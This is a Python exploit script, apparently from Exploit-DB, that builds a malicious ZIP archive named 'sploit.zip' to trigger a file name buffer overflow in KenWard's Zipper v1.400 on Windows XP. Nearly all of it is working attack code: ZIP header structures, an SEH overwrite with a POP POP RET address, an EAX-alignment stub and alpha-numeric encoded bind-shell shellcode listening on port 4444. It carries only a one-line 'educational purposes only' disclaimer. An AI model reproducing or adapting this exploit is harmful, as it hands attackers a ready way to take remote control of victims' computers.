#!/usr/bin/python

## KenWard's Zipper v1.400 File Name Buffer Overflow
## Coded by sinn3r  (x90.sinner{at}gmail{d0t}com)
## Tested on: Windows XP SP3 ENG
## Reference: http://www.exploit-db.com/exploits/11834
## Big thanks to mr_me, and corelanc0d3r.
## greetz to all the friends at Corelan Scurity Team & Exploit-DB... coolest people ever!
##
## Description:
## This exploit takes advantage of the fact too many characters get mangled, as a result
## I was able to get a shell in a more straight forward way.  Very interesting exercise.
## Mr_me and tecR0c figured out this trick, of course.  But I was given the honor to share it.

## Script provided 'as is', without any warranty.
## Use for educational purposes only.  Do not use this code to do anything illegal.

## Zip file format based on:
## http://en.wikipedia.org/wiki/ZIP_(file_format)
local_file_header = (
"\x50\x4B\x03\x04" 	#Local file header signature
"\x00\x02"		#Version needed to extract
"\x00\x08"		#General purpose bit flag
"\x00\xDA"		#Compression method
"\xA2\x48"		#File last modification time
"\x3B\xF6"		#File last modification date
"\x66\x18\x0D\x4E"	#CRC-32
"\xEF\x0F\x00\x00"	#Compressed size (payload size)
"\x14\x00\x00\x00"	#Uncompressed size
"\xe4\x4f"		#File name length
"\x04\x00"		#Extra field length
#"\x73\x65\x63\x72\x65\x74\x73"	#File name (n) ASCII "secrets"
#"\x42\x42\x42\x42"	#Extra field (m)
);

central_directory_file_header = (
"\x50\x4b\x01\x02"	#Central directory file header signature
"\x14\x00"		#Version made by
"\x14\x00"		#Version needed to extract
"\x00\x08"		#General purpose bit flag
"\x00\xDA"		#Compression method
"\xA2\x48"		#File last modification time
"\x3B\xF6"		#File last modification date
"\x66\x18\x0D\x4E"	#CRC-32
"\xE4\x0F\x00\x00"	#Compressed size (payload size)
"\x14\x00\x00\x00"	#Uncompressed size
"\xe4\x0f"		#File name length (n)
"\x04\x00"		#Extra field length (m)
"\x04\x00"		#File comment length
"\x00\x01"		#Disk number where file starts
"\x00\x00"		#Internal file attributes
"\x20\x00\x00\x00"	#External file attributes
"\x00\x00\x00\x00"	#Relative offset of local file header
#"\x73\x65\x63\x72\x65\x74\x73"	#File name (n) ASCII "secrets"
#"\x42\x42\x42\x42"	#Extra field (m)
#"\x43\x43\x43\x43"	#File comment (k)
);

end_of_central_directory_record = (
"\x50\x4B\x05\x06"	#End of central directory signature
"\x00\x00"		#Number of this disk
"\x00\x00"		#Disk where central directory starts
"\x01\x00"		#Number of central directory records on this disk
"\x01\x00"		#Total number of central directory records
"\x12\x10\x00\x00"	#Size of central directory (central directory size + payload)
"\x02\x10\x00\x00"	#Offset of start of central directory, relative to start of archive (lfh + payload)
"\x00\x00"		#Zip file comment length (n)
);


## Align EAX for the base address of the alpha2 encoded bindshell
alignEAX = (
"\x05\x10\x7E\x10\x7E"	#ADD EAX, 0x7E107E10
"\x05\x09\x75\x01\x7E"	#ADD EAX, 0x7E017509
"\x05\x02\x03\x01\x04"	#ADD EAX, 0x04010302
"\x72\x07"+		#JB jump over the bytes we can't overwrite
"\x41"*12		#NOPs
);

## windows/shell_bind_tcp lport=4444 exitfunc=seh
## alpha2 eax --uppercase   744 bytes
shellcode = ("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMYEP5PS03PK"
"9ZE6QN2CTLK0RVPLKPR4LLKQBTTLKSBVH4ONWQZVFFQKOFQO0NLGL3QSL4BVLQ0YQXO4MUQIWKRJPF2QGLKPRB0"
"LKPBGLEQ8PLK70RXMUO0BTQZEQHPPPLK78TXLK687PS1XSM37LPILKWDLKUQ8V6QKO6QYPNL9Q8OTMEQ9WFXKPT"
"5ZT33SMJX7KCM14CEZB1HLKPXWTUQN3SVLKTLPKLKV85LEQXSLK34LKS1HPK9W47TQ4QK1KSQQI0Z0QKOM0PXQO"
"QJLKTRJKK61MSXVS02EP5PCXBW3CFRQOF4SXPLT77VDGKO9EX8LPS1UPS0WYO4F4PP3X7YMP2KS0KOHUV00P0P6"
"0QPV01PPPRHJJTOIOKPKON5MYO7FQYK0SSXS2S0TQQLMYKVSZB0PVPW3XO2YK7GCWKO8UPSPWE8X7KYWHKOKOHU"
"QCV3PWSX2TJLGKKQKON5V7MYHG58BU2N0M3QKON52HRCBM54UPMYKS0W67676QL62JTRPYPVKRKMSVO774WTWLU"
"QUQLM0DGTB0O65PPD0TV0PV0V0VQVPVPNPV1FQC66SXT9XLWOLFKOYEK9M0PNV6QVKOFPCXUXK75MSPKON5OKKN"
"TNP2ZJBHY6LUOMMMKON5WLUV3L5ZK0KKKPRUC5OKW74S2R2ORJ5PPSKO8UUZA")

## 4064+4 bytes
## Pointer to next SEH record: 1022 bytes
## SE handler                : 1026 bytes
payload = (
"\x41"*(1017-len(alignEAX)-len(shellcode))+	#Padding
alignEAX+					#Align EAX for the bindshell
shellcode+					#Bindshell lport 4444
"\x82\x85\x81\x98\x98"				#This will get mangled and become "\xE9\xE0\xFC\xFF\xFF"
"\x73\x97\x42\x42"				#JNB 0x97 = JNB 0xF9 = Same as EB 0xFB = Rewind 5 bytes
"\x7E\x27\x41\x00"+				#POP POP RET = 0x0041277E
"\x44"*3034+					#Padding
".bin"						#Fake name
);

## Create the ZIP structure with our payload
zip = (
local_file_header +
payload +
central_directory_file_header +
payload +
end_of_central_directory_record
);

f = open("sploit.zip", "w")
f.write(zip)
f.close()

print "[*] Local file header size = 0x%x" %len(local_file_header)
print "[*] Central directory file header size = 0x%x" %len(central_directory_file_header)
print "[*] End of central directory record size = 0x%x" %len(end_of_central_directory_record)
print "[*] Payload size = %s bytes" %len(payload)
print "[*] sploit.zip created.  Open it with KenWard's Zipper."